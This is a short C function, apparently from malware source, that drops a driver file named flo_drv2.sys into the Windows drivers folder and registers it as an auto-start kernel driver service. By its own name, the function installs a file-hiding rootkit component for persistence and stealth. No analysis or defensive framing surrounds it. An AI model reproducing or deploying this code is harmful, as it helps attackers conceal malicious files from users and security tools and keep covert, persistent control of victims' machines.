void RegisterFileHidingDriver(void){
    
	char	buf[256];

	GetSystemDirectory(buf, 256);
	strcat(buf, "\\drivers\\flo_drv2.sys");
	if(!FileExist(buf)){
        CreateFileDriver();
        SC_HANDLE hSCHandle = OpenSCManager(0,0,SC_MANAGER_ALL_ACCESS);
		if(hSCHandle){
			SC_HANDLE hServiceHandle;
			BOOL bReturn = TRUE;
			hServiceHandle = CreateService(hSCHandle, "flo_drv2", "flo_drv2", SERVICE_START | SERVICE_STOP, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, buf, NULL, NULL, NULL, NULL, NULL);
			if(hServiceHandle){
				StartService(hServiceHandle, 0, NULL);
			}
			CloseServiceHandle(hSCHandle);
		}
	}
}
